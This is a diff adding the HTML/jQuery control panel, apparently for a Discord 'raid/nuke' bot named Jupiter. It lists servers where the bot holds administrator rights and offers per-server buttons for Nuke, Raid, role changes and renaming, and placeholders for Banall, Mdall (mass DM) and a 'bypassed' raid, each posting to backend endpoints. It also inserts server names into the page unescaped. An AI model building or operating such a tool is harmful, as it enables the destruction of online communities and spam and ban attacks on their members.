@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+    <script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
+    <title>Jupiter</title>
+    <link rel="icon" href="src/logo.gif">
+
+
+</head>
+
+<body>
+
+    <button class="cornerbutton" type="button"></button>
+    <div class="loader">
+        <script type="text/javascript">
+            $(window).on('load', function () {
+                $(".loader").fadeOut(3000);
+            });
+        </script>
+    </div>
+    <div class="presentacion slide">
+        <img class="logo" src="src/icon.png" alt="Jupiter">
+        <div class="column-1">
+            <h1 class="titulo">Jupiter Public</h1>
+            <p id="botlog" class="margin-1"></p>
+        </div>
+        <a href="index.html" target="_blank">
+            <button type="button" class="boton-1 margin-1">Informacion</button>
+        </a>
+        <button type="button" class="boton-1 margin-1" id="reiniciar">Reiniciar</button>
+    </div>
+
+
+
+    <script type="text/javascript">
+        $(document).ready(function () {
+            document.body.addEventListener('wheel', function (e) {
+                window.scrollBy(0, e.deltaY);
+                e.preventDefault();
+            }, { passive: false });
+            $("#reiniciar").click(function () {
+
+                $.ajax({
+                    url: '/reiniciar',
+                    method: 'POST',
+                    data: {},
+                    success: function (response) {
+                        $('#res').text(response)
+                        $('#note').text('Recarga la pagina para ver cambios.')
+                        $('#aviso').removeClass('oculto');
+                        document.addEventListener('click', function (event) {
+                            $('#aviso').addClass('oculto')
+                        })
+                    },
+                    error: function (error) {
+                        console.error('Error al enviar el dato:', error);
+                    }
+                });
+            });
+
+            $.ajax({
+                url: '/botinfo',
+                method: 'GET',
+                success: function (response) {
+                    $('#botlog').text('Logged in: ' + response);
+                },
+                error: function (error) {
+                }
+            });
+        });
+    </script>
+    <div class="cuadro margin-2">
+        <h2>Servidores</h2>
+        <p>Servidores donde el bot tiene permisos de administrador.</p>
+    </div>
+    <div id="serversContainer" class="margin-2"></div>
+    <script>
+        $(document).ready(function () {
+            $.ajax({
+                url: '/getservers',
+                method: 'GET',
+                success: function (servers) {
+                    console.log('Servidores recibidos:', servers);
+                    servers.forEach(server => {
+                        // Crea un div para cada servidor
+                        var serverDiv = $('<div class="server cuadro slide-down"></div>');
+
+
+                        serverDiv.append('<h2>' + server.name + '</h2>');
+                        serverDiv.append('<p>' + server.id + '</p>');
+
+                        serverDiv.append('<div class="margin-3">')
+                        serverDiv.append('<button class="serverButton boton-1" title="Nuke" data-server-id="' + server.id + '"><img src="src/nuke.png" width="30" weight="30"></img></button>');
+                        serverDiv.append('<button class="raidButton boton-1 margin-1" title="Raid" data-server-id="' + server.id + '"><img src="src/raid.png" width="30" weight="30"></img></button>');
+                        serverDiv.append('<button class="fotoButton boton-1 margin-1" title="Foto + Nombre" data-server-id="' + server.id + '"><img src="src/server.png" width="30" weight="30"></img></button>');
+                        serverDiv.append('<button class="rolesButton boton-1 margin-1" title="Roles" data-server-id="' + server.id + '"><img src="src/leave.png" width="30" weight="30"></img></button>');
+                        serverDiv.append('<button class="leaveButton boton-1 margin-1" title="Salir" data-server-id="' + server.id + '"><img src="src/leave2.png" width="30" weight="30"></img></button>');
+                        serverDiv.append('</div>')
+                        serverDiv.append('<div class="margin-3">');
+                        serverDiv.append('<h3>No disponibles</h3>')
+                        serverDiv.append('<button class="bypassButton boton-1 margin-1 not-allowed" title="Bypassed Raid" data-server-id="' + server.id + '"><img src="src/fun1.png" width="30" weight="30"></img></button>')
+                        serverDiv.append('<button class="jupiterButton boton-1 margin-1 not-allowed" title="Rol Jupiter" data-server-id="' + server.id + '"><img src="src/jupiter.png" width="30" weight="30"></img></button>')
+                        serverDiv.append('<button class="infoButton boton-1 margin-1 not-allowed" title="Informacion" data-server-id="' + server.id + '"><img src="src/info.png" width="30" weight="30"></img></button>');
+                        serverDiv.append('<button class="banButton boton-1 margin-1 not-allowed" title="Banall" data-server-id="' + server.id + '"><img src="src/banall.png" width="25" weight="25"></img></button>');
+                        serverDiv.append('<button class="mdallButton boton-1 margin-1 not-allowed" title="Mdall" data-server-id="' + server.id + '"><img src="src/mdall.png" width="30" weight="30"></img></button>');
+                        serverDiv.append('</div>');
+
+                        $('#serversContainer').append(serverDiv);
+                    });
+
+
+                },
+                error: function (error) {
+                    console.error('Error al obtener la información de los servidores:', error);
+                }
+            })
+
+
+
+
+            $('#serversContainer').on('click', '.serverButton', function () {
+                var serverId = $(this).data('server-id');
+                $.ajax({
+                    url: '/nuke',
+                    method: 'POST',
+                    data: { serverId: serverId },
+                    success: function (response) {
+                        console.log('Raid, response:', response);
+                    },
+                    error: function (error) {
+                        console.error('Error al manejar clic de botón:', error);
+                    }
+                });
+            });
+
+            $('#serversContainer').on('click', '.leaveButton', function () {
+                var serverId = $(this).data('server-id');
+                console.log('/leave')
+                $.ajax({
+                    url: '/leave',
+                    method: 'POST',
+                    data: { serverId: serverId },
+                    success: function (response) {
+                        console.log('leave, response:', response);
+                    },
+                    error: function (error) {
+                        console.error('Error al manejar clic de botón:', error);
+                    }
+                });
+            });
+
+
+            $('#serversContainer').on('click', '.rolesButton', function () {
+
+                console.log('/roles')
+                var serverId = $(this).data('server-id');
+                $.ajax({
+                    url: '/roles',
+                    method: 'POST',
+                    data: { serverId: serverId },
+                    success: function (response) {
+                        console.log('Roles, response:', response);
+                    },
+                    error: function (error) {
+                        console.error('Error al manejar clic de botón:', error);
+                    }
+                });
+            });
+            $('#serversContainer').on('click', '.raidButton', function () {
+                var serverId = $(this).data('server-id');
+                $.ajax({
+                    url: '/raid',
+                    method: 'POST',
+                    data: { serverId: serverId },
+                    success: function (response) {
+                        console.log('Raid, response:', response);
+                    },
+                    error: function (error) {
+                        console.error('Error al manejar clic de botón:', error);
+                    }
+                });
+            });
+            $('#serversContainer').on('click', '.fotoButton', function () {
+                var serverId = $(this).data('server-id');
+                $.ajax({
+                    url: '/server',
+                    method: 'POST',
+                    data: { serverId: serverId },
+                    success: function (response) {
+                        console.log('Raid, response:', response);
+                    },
+                    error: function (error) {
+                        console.error('Error al manejar clic de botón:', error);
+                    }
+                });
+            });
+
+            $.ajax({
+                url: '/backgrounds',
+                method: 'GET',
+                success: function (response) {
+                    const backgrounds = response
+                    var randomIndex = Math.floor(Math.random() * backgrounds.length);
+                    var randomBackground = backgrounds[randomIndex];
+
+
+                    var style = document.styleSheets[0];
+                    style.insertRule('body::before { background-image: url("src/backgrounds/' + randomBackground + '"); }', style.cssRules.length);
+
+                },
+                error: function (error) {
+                    console.log(error)
+                }
+            });
+
+            $('.cornerbutton').click(function () {
+                console.log('enseñando fondo.')
+                if ($('#serversContainer').is(":visible")) {
+                    $('#serversContainer').hide();
+                } else {
+                    $('#serversContainer').show();
+                }
+                document.body.classList.toggle('sinBlur');
+
+            })
+        })
+
+
+
+    </script>
+    <div class="aviso oculto" id="aviso">
+        <h4 id="res"></h4>
+        <p id="note"></p>
+    </div>
+    </div>
+
+</body>
+
+</html>
